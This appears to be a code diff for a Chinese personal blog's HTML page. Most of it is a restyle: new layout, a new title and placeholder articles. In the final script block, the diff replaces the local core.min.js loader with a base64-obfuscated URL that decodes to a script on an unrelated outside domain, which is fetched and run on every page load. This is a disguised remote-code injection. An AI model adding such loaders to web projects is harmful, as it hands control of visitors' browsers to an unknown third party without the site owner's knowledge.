@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>我的数字游牧日志</title>
+    <title>我的思考日志</title>
     <style>
         /* 全局样式 */
         body {
@@ -13,335 +13,368 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F0F8FF;
-            /* 浅蓝色背景 */
-            color: #333333;
-            /* 深灰色文本 */
+            background-color: #F8FBFD;
+            /* 浅蓝灰色背景 */
+            color: #343A40;
+            /* 深炭灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
-            /* 隐藏横向滚动条 */
-            scroll-behavior: smooth;
-            /* 平滑滚动 */
-            scroll-snap-type: x mandatory;
-            /* 强制水平吸附滚动 */
         }
 
         .container {
-            display: flex;
-            /* 使用flex布局实现水平排列 */
-            width: fit-content;
-            /* 宽度适应内容 */
-            height: 100vh;
-            /* 容器高度占满视口 */
+            max-width: 95%;
+            /* 适应移动端宽度 */
+            margin: 0 auto;
+            padding: 15px;
         }
 
-        /* 导航菜单 - 顶部固定 */
-        .main-nav {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
-            /* 半透明白色背景 */
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            z-index: 999;
-            padding: 10px 0;
+        /* 头部样式 */
+        header {
             text-align: center;
+            padding: 40px 20px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
-        .main-nav ul {
+        header h1 {
+            color: #2C3E50;
+            /* 深蓝灰色标题 */
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        header p {
+            color: #607D8B;
+            /* 柔和的蓝灰色 */
+            font-size: 1.1em;
+            margin: 0;
+        }
+
+        /* 导航菜单 - 简单链接 */
+        nav ul {
             list-style: none;
             padding: 0;
-            margin: 0;
+            margin-top: 25px;
             display: flex;
             justify-content: center;
             flex-wrap: wrap;
         }
 
-        .main-nav ul li {
-            margin: 0 12px;
+        nav ul li {
+            margin: 0 10px 10px 10px;
         }
 
-        .main-nav ul li a {
+        nav ul li a {
             text-decoration: none;
-            color: #007BFF;
+            color: #3498DB;
             /* 强调色：蓝色 */
             font-weight: bold;
-            padding: 8px 15px;
-            border-radius: 20px;
-            transition: background-color 0.3s ease, color 0.3s ease;
+            padding: 10px 18px;
+            border-radius: 25px;
+            /* 药丸形按钮 */
+            border: 1px solid #3498DB;
+            transition: all 0.3s ease;
         }
 
-        .main-nav ul li a:hover {
-            background-color: #EBF5FF;
-            /* 浅蓝色背景 */
-            color: #0056B3;
+        nav ul li a:hover {
+            background-color: #3498DB;
+            color: #FFFFFF;
+            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
         }
 
-        /* 各个水平滚动区块 */
-        section.full-screen-section {
-            min-width: 100vw;
-            /* 每个区块占据整个视口宽度 */
-            height: 100vh;
-            /* 每个区块占据整个视口高度 */
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            box-sizing: border-box;
-            /* 包含padding在内的宽度 */
-            scroll-snap-align: start;
-            /* 滚动吸附到起始位置 */
-            text-align: center;
+        /* 主要内容区 */
+        main {
+            padding-top: 0;
+        }
+
+        section {
             background-color: #FFFFFF;
-            /* 默认白色背景 */
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
-            border-right: 1px solid #E0E0E0;
-            /* 分隔线 */
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
-        /* 英雄区特定样式 */
-        #hero-section {
-            background-color: #E0FFFF;
-            /* 浅青色背景 */
+        h2 {
             color: #2C3E50;
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #E0EBF5;
+            padding-bottom: 12px;
+            text-align: center;
         }
 
-        #hero-section h1 {
-            font-size: 3em;
+        h3 {
+            color: #343A40;
+            font-size: 1.3em;
+            margin-top: 20px;
             margin-bottom: 15px;
-            letter-spacing: 1px;
-            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
         }
 
-        #hero-section p {
-            font-size: 1.2em;
-            max-width: 80%;
+        p {
+            color: #495057;
+            font-size: 1em;
+            margin-bottom: 18px;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            display: block;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        /* 特色文章样式 */
+        .featured-article {
+            padding: 30px;
+            /* 更多内边距 */
+            background-color: #ECF0F1;
+            /* 浅灰背景，突出特色 */
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .featured-article .featured-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin: 0 auto 25px;
+            /* 居中图片 */
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .featured-article h3 {
+            color: #3498DB;
+            /* 强调色标题 */
+            font-size: 2em;
+            /* 更大标题 */
+            margin-bottom: 15px;
+        }
+
+        .featured-article .date {
+            color: #7F8C8D;
+            font-size: 0.95em;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .featured-article p {
+            font-size: 1.1em;
+            max-width: 700px;
             margin: 0 auto 30px;
         }
 
-        /* 关于我区特定样式 */
-        #about-section {
-            background-color: #FFFACD;
-            /* 浅黄色背景 */
-            color: #333333;
+        .featured-article .read-more-button {
+            display: inline-block;
+            background-color: #3498DB;
+            color: #FFFFFF;
+            padding: 15px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
         }
 
-        #about-section img {
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 20px;
-            border: 4px solid #FFD700;
-            /* 金色边框 */
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        .featured-article .read-more-button:hover {
+            background-color: #2980B9;
+            transform: translateY(-3px);
         }
 
-        /* 文章区特定样式 */
-        #articles-section {
-            background-color: #E6E6FA;
-            /* 浅紫色背景 */
-            color: #333333;
-            display: block;
-            /* 覆盖flex，允许内部垂直滚动 */
-            overflow-y: auto;
-            /* 允许文章列表垂直滚动 */
-            -webkit-overflow-scrolling: touch;
-            /* 改善iOS滚动体验 */
-        }
-
-        #articles-section .article-list {
+        /* 最新文章列表样式 */
+        .recent-articles-list {
             list-style: none;
             padding: 0;
-            margin: 0 auto;
-            max-width: 500px;
-            /* 限制文章列表宽度 */
+            margin: 0;
         }
 
-        #articles-section .article-card {
+        .recent-articles-list li {
             background-color: #FFFFFF;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
             margin-bottom: 15px;
-            text-align: left;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        #articles-section .article-card:hover {
-            transform: translateY(-5px);
+        .recent-articles-list li:hover {
+            transform: translateY(-3px);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
 
-        #articles-section .article-card img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            margin-top: 10px;
-            margin-bottom: 15px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-        }
-
-        #articles-section .article-card h3 {
-            color: #4B0082;
-            /* 深紫色标题 */
-            font-size: 1.4em;
+        .recent-articles-list li h4 {
+            color: #343A40;
+            font-size: 1.2em;
             margin-top: 0;
             margin-bottom: 8px;
         }
 
-        #articles-section .article-card .date {
-            color: #777777;
-            font-size: 0.9em;
+        .recent-articles-list li .date {
+            color: #888888;
+            font-size: 0.85em;
             margin-bottom: 10px;
-            display: block;
         }
 
-        #articles-section .article-card p {
-            font-size: 0.95em;
-            color: #555555;
+        .recent-articles-list li a {
+            text-decoration: none;
+            color: #3498DB;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .recent-articles-list li a:hover {
+            color: #2980B9;
+        }
+
+        /* 关于我/联系区 */
+        .about-contact-section {
+            background-color: #FFFFFF;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .about-contact-section h2 {
+            color: #2C3E50;
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #E0EBF5;
+            padding-bottom: 12px;
+        }
+
+        .about-contact-section p {
+            color: #4A4A4A;
             margin-bottom: 15px;
         }
 
-        #articles-section .article-card .read-more {
-            display: inline-block;
-            background-color: #8A2BE2;
-            /* 紫罗兰色按钮 */
-            color: #FFFFFF;
-            padding: 8px 18px;
-            border-radius: 20px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: background-color 0.3s ease;
-        }
-
-        #articles-section .article-card .read-more:hover {
-            background-color: #6A0DAD;
-        }
-
-        /* 联系区特定样式 */
-        #contact-section {
-            background-color: #ADD8E6;
-            /* 浅蓝色背景 */
-            color: #333333;
-        }
-
-        #contact-section .contact-info p {
-            margin-bottom: 10px;
-            font-size: 1.1em;
-        }
-
-        #contact-section .contact-info a {
-            color: #007BFF;
+        .about-contact-section a {
+            color: #3498DB;
             text-decoration: none;
             font-weight: bold;
             transition: color 0.3s ease;
         }
 
-        #contact-section .contact-info a:hover {
-            color: #0056B3;
+        .about-contact-section a:hover {
+            color: #2980B9;
         }
 
-        #contact-section .social-links {
-            margin-top: 30px;
+        /* 社交链接 */
+        .social-links {
+            margin-top: 20px;
         }
 
-        #contact-section .social-links a {
+        .social-links a {
             display: inline-block;
-            margin: 0 15px;
-            color: #007BFF;
-            font-size: 2.5em;
+            margin: 0 10px;
+            color: #3498DB;
+            font-size: 2em;
             text-decoration: none;
             transition: transform 0.3s ease;
         }
 
-        #contact-section .social-links a:hover {
-            transform: translateY(-5px);
-            color: #0056B3;
+        .social-links a:hover {
+            transform: translateY(-3px);
+            color: #2980B9;
         }
 
-        /* 通用标题样式 */
-        .section-title {
-            font-size: 2.2em;
-            color: #2C3E50;
-            margin-bottom: 30px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid rgba(0, 0, 0, 0.1);
+        /* 页脚样式 */
+        footer {
+            text-align: center;
+            padding: 25px 0;
+            color: #777777;
+            font-size: 0.9em;
+            border-top: 1px solid #E0EBF5;
+            margin-top: 25px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <nav class="main-nav">
-        <ul>
-            <li><a href="#hero-section">首页</a></li>
-            <li><a href="#about-section">关于我</a></li>
-            <li><a href="#articles-section">文章</a></li>
-            <li><a href="#contact-section">联系</a></li>
-        </ul>
-    </nav>
-
     <div class="container">
-        <!-- 英雄区 -->
-        <section id="hero-section" class="full-screen-section">
-            <h1>我的数字游牧日志</h1>
-            <p>探索世界，编码生活，分享我的旅程与思考。</p>
-            <a href="#articles-section"
-                style="display: inline-block; background-color: #007BFF; color: #FFFFFF; padding: 15px 30px; border-radius: 30px; text-decoration: none; font-weight: bold; font-size: 1.1em; margin-top: 30px; box-shadow: 0 5px 15px rgba(0,123,255,0.3); transition: background-color 0.3s ease, transform 0.3s ease;">开始阅读</a>
-        </section>
+        <header>
+            <h1>我的思考日志</h1>
+            <p>记录我的技术探索与生活感悟</p>
+            <nav>
+                <ul>
+                    <li><a href="#featured-article">精选</a></li>
+                    <li><a href="#recent-articles">最新</a></li>
+                    <li><a href="#about">关于</a></li>
+                    <li><a href="#contact">联系</a></li>
+                </ul>
+            </nav>
+        </header>
 
-        <!-- 关于我区 -->
-        <section id="about-section" class="full-screen-section">
-            <h2 class="section-title">关于我</h2>
-            <img src="https://picsum.photos/180/180?random=<%= new Date().getTime() + 1 %>" alt="博主个人肖像">
-            <p style="max-width: 600px;">我是一名热爱自由的软件开发者，同时也是一名数字游牧者。我喜欢在世界各地旅行，体验不同的文化，并将这些经历融入我的代码和文字中。</p>
-            <p style="max-width: 600px;">这个博客是我记录技术心得、旅行见闻和个人成长的平台。希望我的分享能为你带来启发，也欢迎你与我交流！</p>
-        </section>
+        <main>
+            <section id="featured-article" class="featured-article">
+                <h2>精选文章</h2>
+                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() %>" class="featured-image"
+                    alt="人工智能与未来科技图">
+                <h3>人工智能的边界与伦理：我们应该思考什么？</h3>
+                <span class="date">发布日期：2023年7月30日</span>
+                <p>随着人工智能技术的飞速发展，它在改变我们生活的同时，也带来了深刻的伦理思考。本文将探讨AI在决策、隐私、就业等方面可能面临的挑战，并呼吁我们共同构建负责任的AI未来。</p>
+                <a href="#" class="read-more-button">深入阅读</a>
+            </section>
 
-        <!-- 文章区 -->
-        <section id="articles-section" class="full-screen-section">
-            <h2 class="section-title">最新文章</h2>
-            <ul class="article-list">
-                <li class="article-card">
-                    <h3>在巴厘岛远程工作：我的经验与建议</h3>
-                    <span class="date">发布日期：2023年7月30日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="巴厘岛海滩上的笔记本电脑">
-                    <p>巴厘岛不仅是度假天堂，也是数字游牧者的热门选择。分享我在巴厘岛远程工作的心得，包括网络、住宿和生活成本。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </li>
-                <li class="article-card">
-                    <h3>使用React Hooks构建高性能组件</h3>
-                    <span class="date">发布日期：2023年7月28日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="React代码片段">
-                    <p>React Hooks极大地简化了组件逻辑和状态管理。本文将深入探讨如何利用`useMemo`和`useCallback`等Hooks优化组件性能。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </li>
-                <li class="article-card">
-                    <h3>东京街头摄影：捕捉瞬间的艺术</h3>
-                    <span class="date">发布日期：2023年7月25日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="东京街头繁忙景象">
-                    <p>东京是一个充满活力的城市，也是街头摄影的绝佳地点。分享我在东京街头捕捉到的精彩瞬间和摄影技巧。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </li>
-            </ul>
-        </section>
+            <section id="recent-articles">
+                <h2>最新文章</h2>
+                <ul class="recent-articles-list">
+                    <li>
+                        <h4><a href="#">前端性能优化：从Lighthouse到实践</a></h4>
+                        <span class="date">2023年7月28日</span>
+                        <p>如何让你的Web应用飞起来？本文将带你了解Lighthouse工具的使用，并分享一些实用的前端性能优化技巧。</p>
+                    </li>
+                    <li>
+                        <h4><a href="#">极简主义生活：少即是多的智慧</a></h4>
+                        <span class="date">2023年7月25日</span>
+                        <p>极简主义不仅仅是一种生活方式，更是一种思维模式。探索如何通过简化，让生活更富足。</p>
+                    </li>
+                    <li>
+                        <h4><a href="#">Python数据分析入门：Pandas库速览</a></h4>
+                        <span class="date">2023年7月22日</span>
+                        <p>Pandas是Python数据分析的利器。本篇将快速介绍Pandas的核心功能，助你开启数据探索之旅。</p>
+                    </li>
+                    <li>
+                        <h4><a href="#">我的摄影器材选择与使用心得</a></h4>
+                        <span class="date">2023年7月20日</span>
+                        <p>分享我常用的摄影器材，以及在不同场景下的使用心得，希望能给摄影爱好者一些参考。</p>
+                    </li>
+                </ul>
+            </section>
 
-        <!-- 联系区 -->
-        <section id="contact-section" class="full-screen-section">
-            <h2 class="section-title">联系我</h2>
-            <div class="social-links">
-                <a href="#" aria-label="GitHub">GitHub</a>
-                <a href="#" aria-label="Twitter">Twitter</a>
-                <a href="#" aria-label="LinkedIn">LinkedIn</a>
-            </div>
-            <p style="margin-top: 50px; font-size: 0.9em; color: #666;">&copy; 2023 我的数字游牧日志. All rights reserved.</p>
-        </section>
+            <section id="about" class="about-contact-section">
+                <h2>关于我</h2>
+                <p>你好！我是一个热爱技术、喜欢思考和分享的创作者。这个博客是我记录学习心得、个人感悟和生活点滴的平台。</p>
+                <p>我相信知识的分享能带来更大的价值，希望我的文字能为你带来启发和乐趣！</p>
+            </section>
+
+            <section id="contact" class="about-contact-section">
+                <h2>联系方式</h2>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">GitHub</a> |
+                    <a href="#" aria-label="Twitter">Twitter</a> |
+                    <a href="#" aria-label="LinkedIn">LinkedIn</a>
+                </div>
+            </section>
+        </main>
+
         <footer>
+            <p>&copy; 2023 我的思考日志. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -356,15 +389,15 @@
 
     <script>
         // 平滑滚动到锚点
-        document.querySelectorAll('.main-nav a[href^="#"]').forEach(anchor => {
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
                 e.preventDefault();
                 const targetId = this.getAttribute('href');
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
-                    targetElement.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
+                        behavior: 'smooth'
                     });
                 }
             });
@@ -383,15 +416,17 @@
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
